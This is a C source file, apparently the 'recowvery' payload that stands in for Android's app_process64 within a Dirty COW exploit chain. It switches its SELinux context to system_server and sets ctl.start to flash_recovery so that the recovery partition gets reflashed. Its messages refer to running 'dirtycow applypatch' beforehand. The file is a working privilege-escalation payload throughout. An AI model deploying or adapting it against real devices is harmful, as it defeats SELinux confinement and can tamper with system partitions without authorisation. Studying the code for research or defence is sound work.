#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>

#define APP_NAME  "recowvery"
#define HOST_NAME "app_process64"

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO,  APP_NAME, __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); }
#define LOGE(...) { __android_log_print(ANDROID_LOG_ERROR, APP_NAME, __VA_ARGS__); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#else
#define LOGV(...) { printf(__VA_ARGS__); printf("\n"); }
#define LOGE(...) { fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#endif

#define SEP LOGV("------------")

#define CONTEXT_SYS "u:r:system_server:s0"
#define PROP_KEY    "ctl.start"
#define PROP_VAL    "flash_recovery"

int main(void)
{
	int ret = 0;
	char *conn = 0;

	LOGV("Welcome to %s! (%s)", APP_NAME, HOST_NAME);
	SEP;

	ret = getcon(&conn);
	if (ret) {
		LOGE("Could not get current security context!");
		goto oops;
	}

	LOGV("Current selinux context: %s", conn);

	ret = setcon(CONTEXT_SYS);
	if (ret) {
		LOGE("Unable to set security context to '%s'!", CONTEXT_SYS);
		goto oops;
	}
	LOGV("Set context to '%s'", CONTEXT_SYS);

	ret = getcon(&conn);
	if (ret) {
		LOGE("Could not get current security context!");
		goto oops;
	}

	LOGV("Current security context: %s", conn);

	if (strcmp(conn, CONTEXT_SYS)) {
		LOGE("Current security context '%s' does not match '%s'!",
			conn, CONTEXT_SYS);
		ret = EINVAL;
		goto oops;
	}

	LOGV("Setting property '%s' to '%s'", PROP_KEY, PROP_VAL);

	ret = property_set(PROP_KEY, PROP_VAL);
	if (ret) {
		LOGE("Failed to set property '%s'!", PROP_KEY);
		goto oops;
	}

	SEP;
	LOGV("Recovery flash script should have started!");
	LOGV("Run on your PC or device to see progress: adb logcat -s recowvery");
	/*
	 * we should wait 3 minutes to allow the flash to complete
	 * and for the user to reboot their device
	 */
	LOGV("Waiting 3 minutes to try again (in case it didn't start or you forgot to dirtycow applypatch first)...");
	sleep(180);
	return 0;
oops:
	/*
	 * we should wait 20 seconds just so Zygote isn't
	 * being constantly restarted
	 */
	LOGE("Error %d: %s", ret, strerror(ret));
	LOGE("Waiting 20 seconds for next try...");
	sleep(20);
	return ret;
}
